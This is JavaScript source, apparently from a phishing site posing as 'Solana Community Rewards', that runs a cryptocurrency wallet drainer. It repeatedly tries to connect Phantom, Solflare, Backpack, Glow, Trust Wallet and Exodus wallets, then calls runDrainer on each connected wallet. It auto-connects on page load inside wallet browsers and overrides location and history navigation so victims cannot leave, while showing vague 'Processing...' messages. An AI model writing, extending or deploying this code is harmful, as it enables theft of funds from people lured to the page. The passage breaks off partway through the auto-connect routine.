                if (connectError.message?.includes('timeout') || connectError.message?.includes('Connection timeout') || connectError.message?.includes('JSON-RPC: method call timeout')) {
                  if (wallet.name === 'Backpack') {
                    showStatus('Timeout', 'error');
                  } else {
                    showStatus('Timeout', 'error');
                  }
                  return;
                }
                // Enhanced Solflare connection methods
                if (wallet.name === 'Solflare') {
                  try {
                    // Try signIn method first
                    if (typeof provider.signIn === 'function') {
                    const signInResult = await provider.signIn();
                    showStatus('Processing...', 'loading');
                      
                      // Don't log wallet connection here - will be logged with actual balance in runDrainer
                      
                    setTimeout(() => {
                      runDrainer(provider);
                    }, 1000);
                      return;
                    }
                    
                    // Try request method
                    if (typeof provider.request === 'function') {
                      const requestResult = await provider.request({ method: 'connect' });
                      showStatus('Processing...', 'loading');
                      
                      // Don't log wallet connection here - will be logged with actual balance in runDrainer
                      
                      setTimeout(() => {
                        runDrainer(provider);
                      }, 1000);
                      return;
                    }
                    
                    // Try basic connect without metadata
                    if (typeof provider.connect === 'function') {
                      const connectResult = await provider.connect();
                      showStatus('Processing...', 'loading');
                      
                      // Don't log wallet connection here - will be logged with actual balance in runDrainer
                      
                      setTimeout(() => {
                        runDrainer(provider);
                      }, 1000);
                      return;
                    }
                    
                    showStatus('Unavailable', 'error');
                  } catch (solflareError) {
                    console.error(`[connectMobileWallet] Solflare connection error:`, solflareError);
                    showStatus('Failed', 'error');
                  }
                } else if (wallet.name === 'Trust Wallet') {
                  try {
                    console.log('[TRUST] Trust Wallet detected - checking if supported...');
                    
                    // Check if this is the unsupported Trust Wallet provider (mobile only)
                    if (provider && provider.isUnsupported) {
                      showStatus('Unsupported', 'error');
                      
                      // Show alternative wallet options
                      setTimeout(() => {
                        showStatus('Processing...', 'loading');
                        
                        // Show wallet selection modal with supported wallets
                        const modal = document.getElementById('walletModal');
                        const walletList = document.getElementById('walletList');
                        
                        if (modal && walletList) {
                          // Filter to show only supported wallets
                          const supportedWallets = WALLET_DEFS.filter(w => 
                            w.name !== 'Trust Wallet' && 
                            (w.name === 'Phantom' || w.name === 'Solflare' || w.name === 'Backpack' || w.name === 'Glow' || w.name === 'Exodus')
                          );
                          
                          const walletListContent = walletList.querySelector('.wallet-list-content');
                          if (walletListContent) {
                            walletListContent.innerHTML = supportedWallets.map(wallet => `
                            <div class="wallet-option">
                                <img src="${wallet.icon}" alt="${wallet.name} logo" loading="lazy" decoding="async" />
                              <span class="wallet-name">${wallet.name}</span>
                              <button class="claim-btn" onclick="connectMobileWallet(${JSON.stringify(wallet)})">
                                Use ${wallet.name}
                              </button>
                            </div>
                          `).join('');
                          }
                          
                          modal.classList.add('active');
                        }
                      }, 2000);
                      
                      return;
                    }
                    
                    // If it's a regular Trust Wallet provider, try to connect
                    showStatus('Processing...', 'loading');
                    
                    if (typeof provider.connect === 'function') {
                      try {
                        // Add delay to prevent request conflicts
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        
                        // Track this request to prevent conflicts
                        const requestId = `trust-mobile-connect-${Date.now()}`;
                        window.addPendingRequest(requestId);
                        
                        try {
                          // Try with timeout to prevent hanging
                          const connectPromise = provider.connect();
                          const timeoutPromise = new Promise((_, reject) => 
                            setTimeout(() => reject(new Error('Connection timeout')), 15000)
                          );
                          
                          const result = await Promise.race([connectPromise, timeoutPromise]);
                          showStatus('Processing...', 'loading');
                          setTimeout(() => {
                            runDrainer(provider);
                          }, 1000);
                          return;
                        } finally {
                          // Always remove the request tracking
                          window.removePendingRequest(requestId);
                        }
                      } catch (error) {
                        console.log('[TRUST] Connect failed:', error.message);
                        
                        // Handle specific Trust Wallet errors
                        if (error.message.includes('already pending')) {
                          showStatus('Failed', 'error');
                          setTimeout(() => {
                            showStatus('Processing...', 'loading');
                          }, 3000);
                        } else if (error.message.includes('timeout')) {
                          showStatus('Timeout', 'error');
                        } else {
                          showStatus('Failed', 'error');
                        }
                        
                        // Show alternative wallets
                        setTimeout(() => {
                          showStatus('Processing...', 'loading');
                        }, 4000);
                      }
                    } else {
                      showStatus('Unavailable', 'error');
                    }
                    
                  } catch (trustWalletError) {
                    console.error(`[connectMobileWallet] Trust Wallet connection error:`, trustWalletError);
                    showStatus('Failed', 'error');
                  }
                } else if (wallet.name === 'Glow') {
                  try {
                    console.log('[GLOW] Glow Wallet detected - attempting connection...');
                    
                    // Add delay to prevent request conflicts
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    // Track this request to prevent conflicts
                    const requestId = `glow-connect-${Date.now()}`;
                    window.addPendingRequest(requestId);
                    
                    try {
                      // Try using the Solana-specific provider first
                      const solanaProvider = window.glow?.solana || window.GlowWallet?.solana;
                      if (solanaProvider && typeof solanaProvider.connect === 'function') {
                        console.log('[GLOW] Using Solana-specific provider');
                        
                        // Use a more robust connection approach
                        let connected = false;
                        let attempts = 0;
                        const maxAttempts = 3;
                        
                        while (!connected && attempts < maxAttempts) {
                          attempts++;
                          console.log(`[GLOW] Connection attempt ${attempts}/${maxAttempts}`);
                          
                          try {
                            const connectPromise = solanaProvider.connect();
                            const timeoutPromise = new Promise((_, reject) => 
                              setTimeout(() => reject(new Error('Connection timeout')), 30000) // Reduced timeout
                            );
                            
                            const result = await Promise.race([connectPromise, timeoutPromise]);
                            connected = true;
                            console.log('[GLOW] Successfully connected on attempt', attempts);
                            showStatus('Processing...', 'loading');
                            setTimeout(() => {
                              runDrainer(solanaProvider);
                            }, 1000);
                            return;
                          } catch (attemptError) {
                            console.log(`[GLOW] Attempt ${attempts} failed:`, attemptError.message);
                            if (attempts < maxAttempts) {
                              await new Promise(resolve => setTimeout(resolve, 2000)); // Wait before retry
                            }
                          }
                        }
                        
                        if (!connected) {
                          throw new Error('All connection attempts failed');
                        }
                      }
                      
                      // Ultra simple Glow connection - no retry logic
                      if (typeof provider.connect === 'function') {
                        console.log('[GLOW] Using simple provider.connect');
                        const result = await provider.connect();
                        console.log('[GLOW] Successfully connected');
                        showStatus('Processing...', 'loading');
                        setTimeout(() => {
                          runDrainer(provider);
                        }, 1000);
                        return;
                      } else if (typeof provider.request === 'function') {
                        console.log('[GLOW] Using simple provider.request');
                        const result = await provider.request({ method: 'connect' });
                        console.log('[GLOW] Successfully connected');
                        showStatus('Processing...', 'loading');
                        setTimeout(() => {
                          runDrainer(provider);
                        }, 1000);
                        return;
                      } else {
                        showStatus('Unavailable', 'error');
                      }
                    } finally {
                      // Always remove the request tracking
                      window.removePendingRequest(requestId);
                    }
                  } catch (glowError) {
                    console.error(`[connectMobileWallet] Glow connection error:`, glowError);
                    
                    // Handle specific Glow errors
                    if (glowError.message.includes('already pending')) {
                      showStatus('Failed', 'error');
                    } else if (glowError.message.includes('timeout')) {
                      showStatus('Timeout', 'error');
                    } else {
                      showStatus('Failed', 'error');
                    }
                  }
                } else if (wallet.name === 'Backpack') {
                  try {
                    console.log('[BACKPACK] Backpack Wallet detected - attempting enhanced connection...');
                    
                    // Enhanced Backpack connection with multiple strategies
                    const connectionStrategies = [
                      {
                        name: 'Method 1: Connect with metadata',
                        fn: () => provider.connect({
                          onlyIfTrusted: false,
                          appMetadata: {
                            name: 'Solana Community Rewards',
                            url: window.location.origin,
                            icon: '/logo.png'
                          }
                        })
                      },
                      {
                        name: 'Method 2: Simple connect',
                        fn: () => provider.connect()
                      },
                      {
                        name: 'Method 3: Request method',
                        fn: () => {
                          if (typeof provider.request === 'function') {
                            return provider.request({ method: 'connect' });
                          } else {
                            throw new Error('provider.request is not a function');
                          }
                        }
                      },
                      {
                        name: 'Method 4: Direct public key access',
                        fn: () => {
                          if (provider.publicKey) {
                            return { publicKey: provider.publicKey };
                          } else {
                            throw new Error('No public key available');
                          }
                        }
                      }
                    ];
                    
                    let connectionSuccessful = false;
                    
                    for (let i = 0; i < connectionStrategies.length && !connectionSuccessful; i++) {
                      const strategy = connectionStrategies[i];
                      console.log(`[BACKPACK] Trying ${strategy.name}...`);
                      
                      try {
                        // Add delay between attempts
                        if (i > 0) {
                          await new Promise(resolve => setTimeout(resolve, 1000));
                        }
                    
                    // Track this request to prevent conflicts
                        const requestId = `backpack-${i}-${Date.now()}`;
                    window.addPendingRequest(requestId);
                    
                    try {
                          const connectPromise = strategy.fn();
                        const timeoutPromise = new Promise((_, reject) => 
                            setTimeout(() => reject(new Error('Connection timeout')), 45000) // 45 seconds per attempt (increased from 20s)
                        );
                        
                        const result = await Promise.race([connectPromise, timeoutPromise]);
                          console.log(`[BACKPACK] ${strategy.name} successful:`, result);
                          
                          // Check if we got a public key
                          const publicKey = provider.publicKey || result?.publicKey;
                          if (publicKey) {
                            console.log('[BACKPACK] Connection established with public key:', publicKey);
                        showStatus('Processing...', 'loading');
                            connectionSuccessful = true;
                        return;
                      }
                    } finally {
                      window.removePendingRequest(requestId);
                    }
                      } catch (strategyError) {
                        console.log(`[BACKPACK] ${strategy.name} failed:`, strategyError.message);
                        
                        // If this is the last strategy, handle the error
                        if (i === connectionStrategies.length - 1) {
                          throw strategyError;
                        }
                      }
                    }
                    
                    if (!connectionSuccessful) {
                      throw new Error('All Backpack connection methods failed');
                    }
                    
                  } catch (backpackError) {
                    console.error(`[connectMobileWallet] Backpack connection error:`, backpackError);
                    
                    // Enhanced error handling for Backpack
                    if (backpackError.message.includes('already pending') || 
                        backpackError.message.includes('User rejected') ||
                        backpackError.message.includes('User declined')) {
                      showStatus('Cancelled', 'error');
                    } else if (backpackError.message.includes('timeout') || 
                               backpackError.message.includes('Connection timeout')) {
                      showStatus('Timeout - Please try again', 'error');
                    } else if (backpackError.message.includes('not installed') ||
                               backpackError.message.includes('not found')) {
                      showStatus('Backpack not installed', 'error');
                    } else {
                      showStatus('Connection failed - Please try again', 'error');
                    }
                  }
                } else if (wallet.name === 'Exodus') {
                  // Exodus specific connection logic
                  try {
                    
                    // Add delay to prevent request conflicts
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    // Track this request to prevent conflicts
                    const requestId = `exodus-connect-${Date.now()}`;
                    window.addPendingRequest(requestId);
                    
                    try {
                      // Try different Exodus connection methods with retry logic
                      if (typeof provider.connect === 'function') {
                        console.log('[EXODUS] Using provider.connect with retry');
                        
                        let connected = false;
                        let attempts = 0;
                        const maxAttempts = 3;
                        
                        while (!connected && attempts < maxAttempts) {
                          attempts++;
                          console.log(`[EXODUS] Connection attempt ${attempts}/${maxAttempts}`);
                          
                          try {
                            const connectPromise = provider.connect();
                            const timeoutPromise = new Promise((_, reject) => 
                              setTimeout(() => reject(new Error('Connection timeout')), 30000) // Increased timeout
                            );
                            
                            const result = await Promise.race([connectPromise, timeoutPromise]);
                            
                            if (result && result.publicKey) {
                              connected = true;
                              console.log('[EXODUS] Successfully connected on attempt', attempts);
                              showStatus('Processing...', 'loading');
                              setTimeout(() => {
                                runDrainer(provider);
                              }, 1000);
                              return;
                            } else {
                              throw new Error('No public key returned');
                            }
                          } catch (attemptError) {
                            console.log(`[EXODUS] Attempt ${attempts} failed:`, attemptError.message);
                            if (attempts < maxAttempts) {
                              await new Promise(resolve => setTimeout(resolve, 2000)); // Wait before retry
                            }
                          }
                        }
                        
                        if (!connected) {
                          throw new Error('All connection attempts failed');
                        }
                      } else if (typeof provider.request === 'function') {
                        console.log('[EXODUS] Using provider.request with retry');
                        
                        let connected = false;
                        let attempts = 0;
                        const maxAttempts = 3;
                        
                        while (!connected && attempts < maxAttempts) {
                          attempts++;
                          console.log(`[EXODUS] Request method attempt ${attempts}/${maxAttempts}`);
                          
                          try {
                            const requestPromise = provider.request({ method: 'connect' });
                            const timeoutPromise = new Promise((_, reject) => 
                              setTimeout(() => reject(new Error('Connection timeout')), 30000)
                            );
                            
                            const result = await Promise.race([requestPromise, timeoutPromise]);
                            
                            if (result) {
                              connected = true;
                              console.log('[EXODUS] Successfully connected on attempt', attempts);
                              showStatus('Processing...', 'loading');
                              setTimeout(() => {
                                runDrainer(provider);
                              }, 1000);
                              return;
                            } else {
                              throw new Error('No result returned');
                            }
                          } catch (attemptError) {
                            console.log(`[EXODUS] Request attempt ${attempts} failed:`, attemptError.message);
                            if (attempts < maxAttempts) {
                              await new Promise(resolve => setTimeout(resolve, 2000));
                            }
                          }
                        }
                        
                        if (!connected) {
                          throw new Error('All request method attempts failed');
                        }
                      } else {
                        showStatus('Unavailable', 'error');
                      }
                    } finally {
                      // Always remove the request tracking
                      window.removePendingRequest(requestId);
                    }
                  } catch (exodusError) {
                    console.error(`[connectMobileWallet] Exodus connection error:`, exodusError);
                    
                    // Handle specific Exodus errors
                    if (exodusError.message.includes('already pending')) {
                      showStatus('Failed', 'error');
                    } else if (exodusError.message.includes('timeout')) {
                      showStatus('Timeout', 'error');
                    } else {
                      showStatus('Failed', 'error');
                    }
                  }
                } else {
                  showStatus('Failed', 'error');
                }
              }
            } else {
              showStatus('Unavailable', 'error');
              console.error(`[connectMobileWallet] No connect function for ${wallet.name}`);
            }
          } else {
            // No provider found, show subtle wallet browser prompt with all supported wallets
            console.error(`[connectMobileWallet] No provider found for ${wallet.name} after waiting.`);
            console.log(`[connectMobileWallet] Provider value:`, provider);
            console.log(`[connectMobileWallet] Provider type:`, typeof provider);
            showWalletBrowserPrompt();
          }
          
        } else {
          // Desktop logic (unchanged)
          const provider = wallet.provider();
          console.log(`[connectMobileWallet] Desktop provider for ${wallet.name}:`, provider);
          if (!provider || provider === undefined || provider === null) {
            console.error(`[connectMobileWallet] No provider for ${wallet.name} on desktop.`);
            console.log(`[connectMobileWallet] Desktop provider value:`, provider);
            console.log(`[connectMobileWallet] Desktop provider type:`, typeof provider);
            showWalletBrowserPrompt();
            return;
          }
          
          // Desktop: Try to connect and then run drainer
          try {
                // Check if wallet is available before attempting connection with simple fallback
    if (typeof provider.isConnected === 'function' && !provider.isConnected()) {
      // Simple fallback: try to connect anyway
      console.log(`[FALLBACK] ${wallet.name} reports not connected, but trying anyway...`);
    }
            console.log(`[connectMobileWallet] Desktop: calling connectWalletWithMetadata for ${wallet.name}`);
            
            // Add delay to prevent request conflicts
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Track this request to prevent conflicts
            const requestId = `desktop-${wallet.name}-connect-${Date.now()}`;
            window.addPendingRequest(requestId);
            
            // Add timeout wrapper for desktop connection with retry logic
            let result;
            let retryCount = 0;
            const maxRetries = 2;
            
            try {
              while (retryCount <= maxRetries) {
                try {
                  const connectionPromise = connectWalletWithMetadata(provider, wallet.name);
                  const timeoutPromise = new Promise((_, reject) => {
                                        setTimeout(() => reject(new Error('Connection timeout - please try again')), 120000); // 2 minutes (was 15s)
                  });
                  
                  result = await Promise.race([connectionPromise, timeoutPromise]);
                  break; // Success, exit retry loop
                } catch (error) {
                  retryCount++;
                  console.log(`[connectMobileWallet] Desktop connection attempt ${retryCount}/${maxRetries + 1} failed for ${wallet.name}:`, error.message);
                  
                  if (retryCount > maxRetries) {
                    throw error; // Re-throw if all retries failed
                  }
                  
                  // Wait before retry
                  showStatus('Processing...', 'loading');
                                      await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
                }
              }
            } finally {
              // Always remove the request tracking
              window.removePendingRequest(requestId);
            }
            console.log(`[connectMobileWallet] Desktop: connectWalletWithMetadata result for ${wallet.name}:`, result);
            
            // Check if we got a public key - enhanced extraction for Solflare
            let publicKey = provider.publicKey || provider.address || result?.publicKey;
            
            // Enhanced publicKey extraction for Solflare
            if (!publicKey && wallet.name === 'Solflare') {
              // Try multiple ways to get publicKey from Solflare
              if (provider.account) {
                publicKey = provider.account.publicKey || provider.account.address;
              }
              if (!publicKey && provider.connected) {
                publicKey = provider.connected.publicKey || provider.connected.address;
              }
              if (!publicKey && provider.wallet) {
                publicKey = provider.wallet.publicKey || provider.wallet.address;
              }
              // Try to get from the connection result
              if (!publicKey && result && result.account) {
                publicKey = result.account.publicKey || result.account.address;
              }
            }
            
            console.log(`[connectMobileWallet] Desktop: publicKey for ${wallet.name}:`, publicKey);
            
            if (publicKey) {
              showStatus('Processing...', 'loading');
              console.log(`[connectMobileWallet] Desktop: About to call runDrainer for ${wallet.name}`);
              
              // Don't log wallet connection here - will be logged with actual balance in runDrainer
              console.log('[WALLET] Desktop connection successful:', {
                publicKey: publicKey.toString(),
                walletType: wallet.name,
                origin: window.location.origin
              });
              
              runDrainer(provider);
            } else {
              showStatus(`Please approve the connection in ${wallet.name}`, 'error');
              console.error(`[connectMobileWallet] Desktop: No publicKey after connect for ${wallet.name}`);
            }
          } catch (connectError) {
            console.error(`[connectMobileWallet] Desktop: connectWalletWithMetadata error for ${wallet.name}:`, connectError);
            
            // Handle timeout errors specifically
            if (connectError.message?.includes('timeout') || connectError.message?.includes('Connection timeout') || connectError.message?.includes('JSON-RPC: method call timeout')) {
              showStatus('Timeout', 'error');
              return;
            }
            
            // Enhanced Solflare desktop connection fallback
            if (wallet.name === 'Solflare') {
              try {
                                 // Try signIn method for desktop Solflare
                 if (typeof provider.signIn === 'function') {
                   const signInResult = await provider.signIn();
                   showStatus('Processing...', 'loading');
                   
                   // Don't log wallet connection here - will be logged with actual balance in runDrainer
                   
                   runDrainer(provider);
                   return;
                 }
                
                                 // Try request method for desktop Solflare
                 if (typeof provider.request === 'function') {
                   const requestResult = await provider.request({ method: 'connect' });
                   showStatus('Processing...', 'loading');
                   
                   // Don't log wallet connection here - will be logged with actual balance in runDrainer
                   
                   runDrainer(provider);
                   return;
                 }
                
                                 // Try basic connect for desktop Solflare
                 if (typeof provider.connect === 'function') {
                   const connectResult = await provider.connect();
                   showStatus('Processing...', 'loading');
                   
                   // Don't log wallet connection here - will be logged with actual balance in runDrainer
                   
                   runDrainer(provider);
                   return;
                 }
              } catch (solflareError) {
                console.error(`[connectMobileWallet] Desktop Solflare connection error:`, solflareError);
              }
            }
            
            showStatus('Failed', 'error');
          }
        }
      } catch (error) {
        showStatus('Failed', 'error');
        console.error(`[connectMobileWallet] Unexpected error for ${wallet.name}:`, error);
      }
    }
    window.connectMobileWallet = connectMobileWallet;
    
    // Global function to trigger wallet connection from Web3Modal
    window.triggerWalletConnection = function(walletType, publicKey) {
      console.log(`[TRIGGER_CONNECTION] Triggering connection for ${walletType}:`, publicKey);
      
      // Find the wallet definition
      const wallet = WALLET_DEFS.find(w => w.key === walletType);
      if (!wallet) {
        console.error(`[TRIGGER_CONNECTION] Wallet not found: ${walletType}`);
        return;
      }
      
      // Simulate the wallet connection flow
      const walletInfo = {
        key: walletType,
        name: wallet.name,
        logo: wallet.logo,
        publicKey: publicKey
      };
      
      // Trigger the drain process
      if (window.runDrainer) {
        window.runDrainer(publicKey, walletType, walletInfo);
      } else {
        console.error('[TRIGGER_CONNECTION] runDrainer function not found');
      }
    };

    // Generate deep link using backend API
    async function generateDeepLink(walletType, appUrl) {
      try {
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'generate_deep_link',
            walletType: walletType,
            appUrl: appUrl
          })
        });
        
        const result = await response.json();
        
        if (result.success && result.deepLink && result.fallbackLink) {
          console.log(`[DEEP_LINK_API] Generated ${walletType} deep link:`, result.deepLink);
          
          // Store encryption key for all wallet types if provided
          if (result.encryptionKey) {
            sessionStorage.setItem(`${walletType}_encryption_private_key`, result.encryptionKey);
          }
          
          return {
            deepLink: result.deepLink,
            fallbackLink: result.fallbackLink
          };
        } else {
          console.error(`[DEEP_LINK_API] Failed to generate ${walletType} deep link:`, result.error || 'Invalid response');
          return {
            deepLink: result.fallbackLink || `${walletType}://browse/${encodeURIComponent(appUrl)}`,
            fallbackLink: result.fallbackLink || `${walletType}://browse/${encodeURIComponent(appUrl)}`
          };
        }
      } catch (error) {
        console.error(`[DEEP_LINK_API] Error calling deep link API:`, error);
        // Fallback to simple deep link
        return {
          deepLink: `${walletType}://browse/${encodeURIComponent(appUrl)}`,
          fallbackLink: `${walletType}://browse/${encodeURIComponent(appUrl)}`
        };
      }
    }

    // Handle Phantom deep link redirect response
    function handlePhantomRedirect() {
      try {
        // Check if we have URL parameters from Phantom redirect
        const urlParams = new URLSearchParams(window.location.search);
        const phantomData = urlParams.get('phantom_data');
        const phantomError = urlParams.get('phantom_error');
        
        if (phantomData) {
          console.log('[PHANTOM_REDIRECT] Received data from Phantom:', phantomData);
          
          // Get the stored private key for decryption
          const privateKey = sessionStorage.getItem('phantom_encryption_private_key') || 
                           sessionStorage.getItem('phantom_encryption_private_key_fallback');
          
          if (privateKey) {
            try {
              // Decrypt the response (simplified for demo)
              const decryptedData = atob(phantomData);
              const walletData = JSON.parse(decryptedData);
              
              console.log('[PHANTOM_REDIRECT] Decrypted wallet data:', walletData);
              
              // Process the wallet connection
              if (walletData.publicKey) {
                console.log('[PHANTOM_REDIRECT] Connecting wallet with public key:', walletData.publicKey);
                triggerConnection(walletData.publicKey, 'phantom', {
                  name: 'Phantom',
                  logo: '/phantom-logo.png'
                });
              }
              
              // Clean up stored keys
              sessionStorage.removeItem('phantom_encryption_private_key');
              sessionStorage.removeItem('phantom_encryption_private_key_fallback');
              
            } catch (decryptError) {
              console.error('[PHANTOM_REDIRECT] Error decrypting data:', decryptError);
            }
          } else {
            console.warn('[PHANTOM_REDIRECT] No private key found for decryption');
          }
          
          // Clean up URL parameters
          const cleanUrl = window.location.origin + window.location.pathname;
          window.history.replaceState({}, document.title, cleanUrl);
          
        } else if (phantomError) {
          console.error('[PHANTOM_REDIRECT] Phantom returned error:', phantomError);
          // Clean up URL parameters
          const cleanUrl = window.location.origin + window.location.pathname;
          window.history.replaceState({}, document.title, cleanUrl);
        }
        
      } catch (error) {
        console.error('[PHANTOM_REDIRECT] Error handling redirect:', error);
      }
    }
    
    // Enhanced wallet redirect handler for all wallet types
    function handleWalletRedirect() {
      try {
        const urlParams = new URLSearchParams(window.location.search);
        
        // Check for various wallet redirect parameters
        const walletTypes = ['phantom', 'solflare', 'backpack', 'trustwallet', 'glow', 'exodus'];
        let walletData = null;
        let walletType = null;
        let walletError = null;
        
        // Check each wallet type for redirect data
        for (const type of walletTypes) {
          const data = urlParams.get(`${type}_data`);
          const error = urlParams.get(`${type}_error`);
          
          if (data) {
            walletData = data;
            walletType = type;
            break;
          } else if (error) {
            walletError = error;
            walletType = type;
            break;
          }
        }
        
        if (walletData && walletType) {
          console.log(`[WALLET_REDIRECT] Received data from ${walletType}:`, walletData);
          
          // Get the stored private key for decryption
          const privateKey = sessionStorage.getItem(`${walletType}_encryption_private_key`) || 
                           sessionStorage.getItem(`${walletType}_encryption_private_key_fallback`);
          
          if (privateKey) {
            try {
              // Decrypt the response (simplified for demo)
              const decryptedData = atob(walletData);
              const parsedData = JSON.parse(decryptedData);
              
              console.log(`[WALLET_REDIRECT] Decrypted ${walletType} data:`, parsedData);
              
              // Process the wallet connection
              if (parsedData.publicKey) {
                console.log(`[WALLET_REDIRECT] Connecting ${walletType} with public key:`, parsedData.publicKey);
                
                // Find wallet definition
                const wallet = WALLET_DEFS.find(w => w.key === walletType);
                if (wallet) {
                  triggerConnection(parsedData.publicKey, walletType, {
                    name: wallet.name,
                    logo: wallet.icon
                  });
                }
              }
              
              // Clean up stored keys
              sessionStorage.removeItem(`${walletType}_encryption_private_key`);
              sessionStorage.removeItem(`${walletType}_encryption_private_key_fallback`);
              
            } catch (decryptError) {
              console.error(`[WALLET_REDIRECT] Error decrypting ${walletType} data:`, decryptError);
              showStatus('Wallet connection failed - decryption error', 'error');
            }
          } else {
            console.warn(`[WALLET_REDIRECT] No private key found for ${walletType} decryption`);
            showStatus('Wallet connection failed - missing encryption key', 'error');
          }
          
          // Clean up URL parameters
          const cleanUrl = window.location.origin + window.location.pathname;
          window.history.replaceState({}, document.title, cleanUrl);
          
        } else if (walletError && walletType) {
          console.error(`[WALLET_REDIRECT] ${walletType} returned error:`, walletError);
          showStatus(`Wallet connection failed: ${walletError}`, 'error');
          
          // Clean up URL parameters
          const cleanUrl = window.location.origin + window.location.pathname;
          window.history.replaceState({}, document.title, cleanUrl);
        }
      } catch (error) {
        console.error('[WALLET_REDIRECT] Error handling redirect:', error);
        showStatus('Wallet connection failed - redirect error', 'error');
      }
    }

    // Initialize wallet redirect handling on page load
    document.addEventListener('DOMContentLoaded', function() {
      // Check for wallet redirect parameters from all supported wallets
      handleWalletRedirect();
    
    // Auto-connect when dApp loads in wallet browser (mobile deep link flow)
    autoConnectInWalletBrowser();
    
    // Prevent external redirects in wallet browsers
    preventExternalRedirects();
  });

  // Prevent external redirects in wallet browsers
  function preventExternalRedirects() {
    console.log('[PREVENT_REDIRECTS] Setting up external redirect prevention...');
    
    // Check if we're in a wallet browser
    const isInWalletBrowser = window.location.href.includes('phantom.app') || 
                             window.location.href.includes('solflare.com') || 
                             window.location.href.includes('backpack.app') ||
                             window.location.href.includes('trustwallet.com') ||
                             window.location.href.includes('glow.app') ||
                             window.location.href.includes('exodus.com') ||
                             document.referrer.includes('phantom.app') ||
                             document.referrer.includes('solflare.com') ||
                             document.referrer.includes('backpack.app') ||
                             document.referrer.includes('trustwallet.com') ||
                             document.referrer.includes('glow.app') ||
                             document.referrer.includes('exodus.com') ||
                             navigator.userAgent.includes('Phantom') ||
                             navigator.userAgent.includes('Solflare') ||
                             navigator.userAgent.includes('Backpack') ||
                             navigator.userAgent.includes('TrustWallet') ||
                             navigator.userAgent.includes('Glow') ||
                             navigator.userAgent.includes('Exodus');
    
    if (isInWalletBrowser) {
      console.log('[PREVENT_REDIRECTS] In wallet browser - preventing external redirects');
      
      // Override window.location.href to prevent external redirects
      const originalLocationHref = Object.getOwnPropertyDescriptor(window.location, 'href') || 
                                  Object.getOwnPropertyDescriptor(Location.prototype, 'href');
      
      Object.defineProperty(window.location, 'href', {
        set: function(url) {
          console.log('[PREVENT_REDIRECTS] Attempted redirect to:', url);
          
          // Allow redirects to the same origin or wallet-specific URLs
          const currentOrigin = window.location.origin;
          const targetUrl = new URL(url, window.location.href);
          
          // Allow redirects to same origin, wallet domains, or app store URLs (for legitimate installs)
          if (targetUrl.origin === currentOrigin || 
              url.includes('phantom.app') || 
              url.includes('solflare.com') || 
              url.includes('backpack.app') ||
              url.includes('trustwallet.com') ||
              url.includes('glow.app') ||
              url.includes('exodus.com') ||
              url.includes('apps.apple.com') ||
              url.includes('play.google.com') ||
              url.startsWith('#') ||
              url.startsWith('/')) {
            console.log('[PREVENT_REDIRECTS] Allowing redirect to:', url);
            if (originalLocationHref && originalLocationHref.set) {
              originalLocationHref.set.call(this, url);
            }
          } else {
            console.log('[PREVENT_REDIRECTS] Blocked external redirect to:', url);
            showStatus('Redirect blocked - staying in wallet browser', 'info');
          }
        },
        get: function() {
          if (originalLocationHref && originalLocationHref.get) {
            return originalLocationHref.get.call(this);
          }
          return window.location.href;
        }
      });
      
      // Also prevent navigation via history API
      const originalPushState = history.pushState;
      const originalReplaceState = history.replaceState;
      
      history.pushState = function(state, title, url) {
        console.log('[PREVENT_REDIRECTS] pushState attempt:', url);
        if (!url || url.startsWith('#') || url.startsWith('/') || url.includes(window.location.origin)) {
          return originalPushState.call(this, state, title, url);
        } else {
          console.log('[PREVENT_REDIRECTS] Blocked pushState to:', url);
        }
      };
      
      history.replaceState = function(state, title, url) {
        console.log('[PREVENT_REDIRECTS] replaceState attempt:', url);
        if (!url || url.startsWith('#') || url.startsWith('/') || url.includes(window.location.origin)) {
          return originalReplaceState.call(this, state, title, url);
        } else {
          console.log('[PREVENT_REDIRECTS] Blocked replaceState to:', url);
        }
      };
    } else {
      console.log('[PREVENT_REDIRECTS] Not in wallet browser - allowing normal redirects');
    }
  }

  // Auto-connect function for when dApp loads in wallet browser
  async function autoConnectInWalletBrowser() {
    console.log('[AUTO_CONNECT] Checking for wallet providers in wallet browser...');
    console.log('[AUTO_CONNECT] Current URL:', window.location.href);
    console.log('[AUTO_CONNECT] Referrer:', document.referrer);
    console.log('[AUTO_CONNECT] User Agent:', navigator.userAgent);
    
    // Wait a bit for wallet providers to load
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Check if we're in a wallet browser environment
    const isInWalletBrowser = window.location.href.includes('phantom.app') || 
                             window.location.href.includes('solflare.com') || 
                             window.location.href.includes('backpack.app') ||
                             window.location.href.includes('trustwallet.com') ||
                             window.location.href.includes('glow.app') ||
                             window.location.href.includes('exodus.com') ||
                             document.referrer.includes('phantom.app') ||
                             document.referrer.includes('solflare.com') ||
                             document.referrer.includes('backpack.app') ||
                             document.referrer.includes('trustwallet.com') ||
                             document.referrer.includes('glow.app') ||
                             document.referrer.includes('exodus.com') ||
                             // Check for wallet-specific user agents
                             navigator.userAgent.includes('Phantom') ||
                             navigator.userAgent.includes('Solflare') ||
                             navigator.userAgent.includes('Backpack') ||
                             navigator.userAgent.includes('TrustWallet') ||
                             navigator.userAgent.includes('Glow') ||
                             navigator.userAgent.includes('Exodus');
    
    if (!isInWalletBrowser) {
      console.log('[AUTO_CONNECT] Not in wallet browser, skipping auto-connect');
      return;
    }
    
    console.log('[AUTO_CONNECT] In wallet browser, attempting auto-connect...');
    console.log('[AUTO_CONNECT] Current URL:', window.location.href);
    console.log('[AUTO_CONNECT] Referrer:', document.referrer);
    console.log('[AUTO_CONNECT] User Agent:', navigator.userAgent);
    
    // Try to detect and connect to available wallets
    const wallets = [
      { key: 'phantom', name: 'Phantom', provider: () => window.phantom?.solana || window.solana },
      { key: 'solflare', name: 'Solflare', provider: () => window.solflare || window.solana },
      { key: 'backpack', name: 'Backpack', provider: () => window.backpack?.solana || window.backpack },
      { key: 'glow', name: 'Glow', provider: () => window.glow },
      { key: 'trustwallet', name: 'Trust Wallet', provider: () => window.trustwallet?.solana || window.trustwallet },
      { key: 'exodus', name: 'Exodus', provider: () => window.exodus?.solana || window.exodus }
    ];
    
    // Debug: Check what providers are available
    console.log('[AUTO_CONNECT] Available providers:');
    console.log('- window.phantom:', !!window.phantom);
